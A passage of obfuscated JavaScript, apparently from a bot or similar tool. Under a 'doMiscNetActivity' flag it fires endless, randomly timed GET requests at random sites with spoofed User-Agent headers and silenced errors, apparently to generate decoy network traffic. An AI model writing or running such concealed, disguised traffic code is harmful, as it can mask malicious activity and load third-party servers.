    f();
    for (let l = -0x263f * 0x1 + -0x595 * -0x2 + -0x3 * -0x907; l < 0x15f1 * 0x1 + -0x121 * -0x12 + -0xe15 * 0x3; l++)
      setTimeout(f, (-0x5 * 0x42ce + 0x7 * 0x1f39 + 0x15dd7) * l * getRandomInt(0x1 * -0x66f + -0x1 * 0x2522 + 0x2b92, -0xcc7 * -0x3 + 0x50a + 0x4b * -0x94));
  }, 0x351a1 * -0xc + 0x5 * -0x10b27b + 0xb23e73);
})()), doFlags['doMiscNetA' + 'ctivity'] && setTimeout(async () => {
  const f = axios['create']({
    'headers': {
      'User-Agent': userAgents['random']()
    }
  });
  f['get'](miscSites['random'](), {
    'timeout': 0x0,
    'headers': {
      'User-Agent': userAgents['random'](),
      'Accept-Encoding': 'none'
    }
  })['catch'](h => {}), setInterval(() => {
    f['get'](miscSites['random'](), {
      'timeout': 0x0,
      'headers': {
        'User-Agent': userAgents['random'](),
        'Accept-Encoding': 'none'
      }
    })['catch'](h => {});
  }, (-0xfc7 * -0x3 + -0x16a6 * 0x2 + 0x194f * 0x1) * getRandomInt(0x29 * 0x57 + -0xaf3 * -0x2 + -0x23d4, 0x1d2 * -0x11 + 0x13dc + -0xb1b * -0x1));
}, -0x2 * 0x3ee + 0xcde + -0xc5 * 0x6);